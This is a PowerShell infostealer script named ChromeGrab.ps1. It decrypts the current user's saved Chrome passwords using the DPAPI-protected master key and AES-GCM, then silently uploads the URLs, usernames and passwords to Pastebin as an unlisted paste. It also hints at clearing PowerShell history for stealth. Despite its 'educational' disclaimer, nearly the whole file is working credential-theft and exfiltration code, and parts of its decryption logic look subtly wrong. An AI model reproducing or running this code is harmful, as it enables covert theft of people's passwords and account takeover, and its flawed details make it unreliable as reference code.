#Requires -RunAsAdministrator # Not strictly necessary for Chrome passwords of current user, but good for other data
# ChromeGrab.ps1 - PowerShell Chrome Password Extractor and Pastebin Exfiltrator
#
# Disclaimer: This script is for educational and authorized testing purposes ONLY.
# Unauthorized use is illegal and unethical.
# ---------------------------------------------------------------------------------

# --- CONFIGURATION ---
$PastebinDevKey = "yE4i9FSZ6J5ilk3QBJ2QQQYeX3_ePIUd" # <<<--- PUT YOUR PASTEBIN API KEY HERE!
$PastebinUploadTitle = "Chrome Passwords - $($env:USERNAME) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$PastebinExpiry = "1H" # 10M, 1H, 1D, 1W, 2W, 1M, 6M, 1Y, N(never)
$PastebinPrivacy = "1" # 0=Public, 1=Unlisted, 2=Private

# --- PATHS ---
$LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$LoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$TempLoginData = "$env:TEMP\LoginData_Temp_$(Get-Date -Format 'yyyyMMddHHmmss').db"

# --- HELPER FUNCTIONS ---

function Get-ChromeMasterKey {
    param (
        [string]$LocalStateFile
    )
    if (-not (Test-Path $LocalStateFile)) {
        throw "Chrome Local State file not found: $LocalStateFile"
    }

    $localStateContent = Get-Content $LocalStateFile | ConvertFrom-Json
    $encryptedKey = $localStateContent.os_crypt.encrypted_key

    # Decode base64
    $decodedKey = [System.Convert]::FromBase64String($encryptedKey)

    # Remove "DPAPI" prefix (first 5 bytes)
    $dpapiData = $decodedKey[5..($decodedKey.Length - 1)]

    # Use DPAPI to decrypt the key
    $dataProtect = New-Object System.Security.Cryptography.DataProtectionScope -ArgumentList @([System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiData, $null, $dataProtect)
    
    return $masterKey
}

function Decrypt-ChromePassword {
    param (
        [byte[]]$EncryptedPassword,
        [byte[]]$MasterKey
    )

    # Encrypted passwords are AES-GCM, format: v10/v11 (1 byte), nonce (12 bytes), ciphertext (X bytes), tag (16 bytes)
    if ($EncryptedPassword.Length -lt 16) { # Minimum length for nonce and tag
        return "[Too Short]"
    }

    $nonce = $EncryptedPassword[3..14]
    $cipherTextAndTag = $EncryptedPassword[15..($EncryptedPassword.Length - 1)]
    $cipherText = $cipherTextAndTag[0..($cipherTextAndTag.Length - 17)]
    $authTag = $cipherTextAndTag[($cipherTextAndTag.Length - 16)..($cipherTextAndTag.Length - 1)]

    $aes = New-Object System.Security.Cryptography.AesGcm($MasterKey)
    $decryptedBytes = [byte[]]::new($cipherText.Length)

    try {
        $aes.Decrypt($nonce, $cipherText, $authTag, $decryptedBytes)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    }
    catch {
        return "[Decryption Failed: $($_.Exception.Message)]"
    }
}

# --- MAIN EXTRACTION LOGIC ---

function Extract-ChromePasswords {
    $results = New-Object System.Collections.ArrayList

    # Check for paths
    if (-not (Test-Path $LocalStatePath)) { $results.Add("Error: Local State file not found.") ; return $results }
    if (-not (Test-Path $LoginDataPath)) { $results.Add("Error: Login Data file not found.") ; return $results }

    # Copy Login Data to a temporary location because it might be locked by Chrome
    try {
        Copy-Item $LoginDataPath $TempLoginData -Force
    }
    catch {
        $results.Add("Error: Could not copy Login Data database. Chrome might be running or permissions issue: $($_.Exception.Message)")
        return $results
    }

    try {
        $masterKey = Get-ChromeMasterKey -LocalStateFile $LocalStatePath
        
        # Connect to SQLite database (requires .NET System.Data.SQLite if not present, but for simplicity, we assume default access)
        # Note: PowerShell can often access SQLite without explicit driver installation for basic queries if the database is readable.
        # For full-blown SQLite management, you might need to load a DLL, but we'll try direct SQL command for Read-Only.
        
        $connectionString = "Data Source=$TempLoginData;Mode=ReadOnly;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT action_url, username_value, password_value FROM logins"
        $reader = $command.ExecuteReader()

        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $username = $reader.GetString(1)
            $encryptedPasswordBytes = $reader.GetValue(2) # This gets the byte array

            if ($url -and $username -and $encryptedPasswordBytes.Length -gt 0) {
                # Check for AES-GCM prefix (v10 or v11)
                if ($encryptedPasswordBytes[0] -eq 10 -or $encryptedPasswordBytes[0] -eq 11) {
                    $decryptedPw = Decrypt-ChromePassword -EncryptedPassword $encryptedPasswordBytes -MasterKey $masterKey
                    $results.Add("URL: $url`nUsername: $username`nPassword: $decryptedPw`n" + ("-"*30))
                }
                else {
                    $results.Add("URL: $url`nUsername: $username`nPassword: [Old/Unknown Format]`n" + ("-"*30))
                }
            }
        }
        $reader.Close()
        $connection.Close()
    }
    catch {
        $results.Add("Fatal Error during extraction: $($_.Exception.Message)")
    }
    finally {
        # Clean up temporary DB file
        if (Test-Path $TempLoginData) {
            Remove-Item $TempLoginData -ErrorAction SilentlyContinue
        }
    }
    return $results
}

# --- PASTEBIN UPLOAD ---
function Upload-ToPastebin {
    param (
        [string]$Content,
        [string]$Title,
        [string]$DevKey,
        [string]$Expiry,
        [string]$Privacy
    )

    if ([string]::IsNullOrWhiteSpace($DevKey) -or $DevKey -eq "YOUR_PASTEBIN_DEV_KEY_HERE") {
        return "Error: Pastebin Developer API Key not configured."
    }

    $apiUrl = "https://pastebin.com/api/api_post.php"
    $body = @{
        "api_dev_key"         = $DevKey
        "api_option"          = "paste"
        "api_paste_code"      = $Content
        "api_paste_name"      = $Title
        "api_paste_private"   = $Privacy
        "api_paste_expire_date" = $Expiry
        "api_paste_format"    = "text"
    }

    try {
        # Using Invoke-RestMethod to perform the HTTP POST request
        $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body
        if ($response -like "*Bad API request*") {
            return "Error: Pastebin API responded: $response"
        }
        else {
            return "Success: Uploaded to Pastebin. URL: $response"
        }
    }
    catch {
        return "Error: Failed to upload to Pastebin: $($_.Exception.Message)"
    }
}

# --- EXECUTION ---
$extractedData = Extract-ChromePasswords

if ($extractedData.Count -gt 0 -and ($extractedData[0] -notlike "Error:*" -or $extractedData[0] -notlike "[!] No Chrome passwords found.")) {
    $uploadResult = Upload-ToPastebin -Content ($extractedData -join "`n") -Title $PastebinUploadTitle -DevKey $PastebinDevKey -Expiry $PastebinExpiry -Privacy $PastebinPrivacy
    # You could uncomment the line below for debugging output if not running silently
    # Write-Host $uploadResult
}
else {
    $uploadResult = "No valid data extracted or encountered errors during extraction."
    # Write-Host $uploadResult # For debugging
}

# Optional: Add a short delay to ensure network requests complete before script terminates
Start-Sleep -Seconds 5

# --- Stealth ---
# Consider adding code here to clear PowerShell history or logs if needed for stealth.
